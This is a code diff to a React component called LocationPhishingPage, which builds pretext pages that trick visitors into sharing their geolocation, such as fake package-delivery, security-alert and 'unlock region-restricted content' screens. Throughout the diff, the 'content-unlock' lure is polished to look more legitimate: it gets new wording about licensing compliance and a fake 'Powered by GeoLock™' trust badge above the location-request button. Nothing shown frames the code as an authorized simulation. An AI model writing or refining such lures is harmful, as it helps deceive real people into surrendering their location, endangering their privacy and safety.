@@ -40,20 +40,13 @@ const templateContent: Record<string, TemplateContent> = {
     brandLogo: <Banknote className="h-7 w-7 text-green-600 mr-2" />,
   },
   'content-unlock': {
-    title: 'Unlock Geo-Restricted Content - RegionFree Access',
+    title: 'Unlock Region-Restricted Content', // Changed title
     actionText: 'Verify Location to Access',
-    message: 'This content is blocked in some areas. Verify with RegionFree Access.',
-    pageSpecificMessage: "Access videos, images, novels, and other files that are restricted in certain countries. Share your location to confirm you reside in a region where this content is available and not blocked.",
+    message: 'This content is currently unavailable in your region. Verify location to potentially unlock.', // Adjusted message
+    pageSpecificMessage: "Access exclusive videos, images, articles, and other files by verifying your location. Some content is geographically restricted, and this step ensures compliance with licensing agreements.",
     heroIcon: Lock,
-    brandName: "RegionFree Access",
-    brandLogo: (
-      <div className="flex items-center">
-        <PlayCircle className="h-5 w-5 text-red-500 mr-1" />
-        <Film className="h-5 w-5 text-blue-500 mr-1" />
-        <FileText className="h-5 w-5 text-gray-500 mr-2" />
-        <Globe className="h-6 w-6 text-teal-500 mr-1" />
-      </div>
-    ),
+    brandName: "Region-Restricted Content", // Changed brandName
+    brandLogo: null, // Removed icons
   },
   default: {
     title: 'Location Verification Needed',
@@ -161,14 +154,15 @@ export default function LocationPhishingPage() {
     const HeroIcon = content.heroIcon || MapPin;
     return (
       <div className="space-y-4">
-        {content.brandLogo && (
-          <div className="flex items-center justify-center text-xl font-semibold text-gray-700 mb-3">
-            {content.brandLogo}
+        {content.brandName && ( // Display brandName if it exists
+          <div className={`flex items-center justify-center text-gray-700 mb-3 ${templateId === 'content-unlock' ? 'text-2xl font-bold' : 'text-xl font-semibold'}`}>
+            {content.brandLogo} {/* This will be null for content-unlock now */}
             <span>{content.brandName}</span>
           </div>
         )}
-        {/* The main title is now handled by PhishingPageLayout, this h1 is for specific page sections if needed or can be removed */}
-        {/* <h1 className="text-2xl font-bold text-center mb-2">{content.title}</h1> */}
+        {/* The main title for the page is set by PhishingPageLayout's title prop.
+            The content.message or specific descriptive texts are used below within each scenario.
+        */}
 
         {templateId === 'package-delivery-issue' && (
           <div className="space-y-6 text-center">
@@ -260,18 +254,25 @@ export default function LocationPhishingPage() {
         {renderTemplateSpecificContent()}
 
         {status !== 'captured' && (
-          <Button
-            onClick={handleLocationRequest}
-            size="lg"
-            className={`w-full text-lg py-6 shadow-md ${
-              templateId === 'security-alert' ? 'bg-destructive hover:bg-destructive/90 text-destructive-foreground'
-              : 'bg-accent hover:bg-accent/90 text-accent-foreground'
-            }`}
-            disabled={isLoading || status === 'requesting'}
-          >
-            <MapPin className="mr-2 h-6 w-6" />
-            {isLoading ? 'Verifying...' : content.actionText}
-          </Button>
+          <>
+            {templateId === 'content-unlock' && (
+              <p className="text-center text-sm text-gray-500 mb-2">
+                Powered by GeoLock<sup>&trade;</sup>
+              </p>
+            )}
+            <Button
+              onClick={handleLocationRequest}
+              size="lg"
+              className={`w-full text-lg py-6 shadow-md ${
+                templateId === 'security-alert' ? 'bg-destructive hover:bg-destructive/90 text-destructive-foreground'
+                : 'bg-accent hover:bg-accent/90 text-accent-foreground'
+              }`}
+              disabled={isLoading || status === 'requesting'}
+            >
+              <MapPin className="mr-2 h-6 w-6" />
+              {isLoading ? 'Verifying...' : content.actionText}
+            </Button>
+          </>
         )}
 
         {status === 'captured' && (
